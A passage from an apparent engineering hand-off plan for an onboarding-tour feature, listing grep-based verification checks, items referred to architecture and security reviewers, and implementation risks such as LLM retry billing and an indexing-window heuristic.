| check | `git grep -n "OnboardingSection\|OnboardingLink" -- server/src client/src mcp/src` → expect no match |
| check | `diff <(sed -n '/---- Onboarding/,/---- Eval/p' server/src/vendor/shared/contracts/knowledge.ts) <(sed -n '/---- Onboarding/,/---- Eval/p' client/src/vendor/shared/contracts/knowledge.ts)` → expect no output |
| check | `git ls-files 'client/src/*.ts' 'client/src/*.tsx' \| xargs perl -0ne 'print "$ARGV\n" if /import\s+\{[^}]*\}\s*from\s*["\x27]\@devdigest\/shared["\x27]/s'` → expect no output (multiline-aware; `import type {…}` does not match; the client has no ESLint config) |
| check | `git grep -nE "className=\"[^\"]*\b(flex|grid|p[xytrbl]?-[0-9]|m[xytrbl]?-[0-9]|text-(xs|sm|lg|xl)|bg-|w-|h-|gap-)" -- "client/src/app/repos/[repoId]/onboarding-tour"` → expect no match (`className="mono"` allowed) |
| check | `git grep -n "Share link\|shareLink" -- "client/src/app/repos/[repoId]/onboarding-tour" client/messages/en/onboarding.json` → expect no match |
| check | `git grep -n "drizzle-orm" -- server/src/modules/onboarding/service.ts server/src/modules/onboarding/generation.ts server/src/modules/onboarding/routes.ts` → expect no match |
| check | `git grep -n "t\.jobs" -- server/src/modules/onboarding` → expect no match (the jobs read exists only in `server/src/modules/repo-intel/repository.ts`) |
| check | `git grep -n "maxRetries: 0" -- server/src/modules/onboarding/generation.ts` → expect one match |
| check | `git grep -n "IF NOT EXISTS" -- "server/src/db/migrations/0020_*.sql"` → expect the table and both indexes |
| dev DB (human) | apply `server/src/db/migrations/0020_*.sql` to the shared dev DB via the `server/INSIGHTS.md` procedure (`\d onboarding_generations` first) |
| manual (live LLM) | Generate a tour on a real JS/TS repo; confirm five sections and no invented paths |

## Out of scope / handed off
- Architecture review → architecture reviewer agent:
  - **the repo-intel repository reading the platform `jobs` table** (`hasRecentActiveIndexJob`, user-confirmed backing for `isIndexing`)
  - the `INDEX_JOB_WINDOW_MS` constant duplicating JobRunner defaults
  - the `resolveInside`/`isDirectory` move to `modules/_shared/checkout-fs.ts`
  - job chaining on `done` outside the queue
  - the size of the `pickView` state machine
- Security review → security reviewer agent:
  - prompt-injection handling (`wrapUntrusted`, 4,000-char caps, env values stripped)
  - free-text grounding (`isGroundedText`, `COUNT_CLAIM_RE`)
  - Markdown/mermaid rendering
  - `target=_blank` with `noopener`
  - workspace isolation of both new routes
  - the log allowlist (no `details.raw`)
  - **Pre-existing:** `POST /repos/:id/resync` (`server/src/modules/repo-intel/routes.ts:44-60`) enqueues for `req.params.id` without checking the repo belongs to `workspaceId`. Re-analyze reuses it. Not fixed here; a follow-up is recommended.
- e2e: none required. Recommended manual flow: empty state → Generate → tour → Regenerate → stale notice after a resync that changes the SHA.

## Risks
- AC-19 transport re-sends: `maxRetries: 0` disables schema reprompts only. `withRetry` inside each adapter attempt (`openai.ts:97`, `anthropic.ts:100`, `resilience.ts:35-44`) can re-send on 429/5xx/network errors, so the provider may bill more than one HTTP request for one logical call. The outer `withTimeout` does not abort the in-flight request; a late response is ignored, and its tokens go unrecorded (tokens null). This is accepted as "one logical structured call".
- The `isIndexing` window is a heuristic. An index run longer than `INDEX_JOB_WINDOW_MS` (420 s), for example a 5,000-file repo with retries, reads as not indexing near its end, and a Generate could then race it. A JobRunner default change in `jobs.ts:40-41` silently invalidates the constant.
- `server/src/modules/repo-intel/index.ts` exports are unverified. If it doesn't re-export constants, add the export, or restate `420_000` in onboarding constants with a comment.
- Free-text grounding is heuristic and may drop a valid summary; the allowlist reduces false drops. `COUNT_CLAIM_RE` misses spelled-out counts ("fourteen routes"); AC-16 holds through the separate fact line.
- The `IconName` value for the nav item is unverified; pick an existing name in `client/src/vendor/ui/icons` (vendored; read its README).
- react-markdown v9 `urlTransform` is assumed to neutralise `javascript:`. T32 asserts it; if it fails, pass an explicit `urlTransform` in `ArchitectureBody`.
- On a partial index without a rank step, the ranked lists can be empty while `filesIndexed > 0`. That correctly does not trigger `no_supported_files`.
- Existing tests asserting the sidebar item count, or `activeKeyFor("/onboarding") === "onboarding-tour"`, may need `test-writer` updates. None were found.
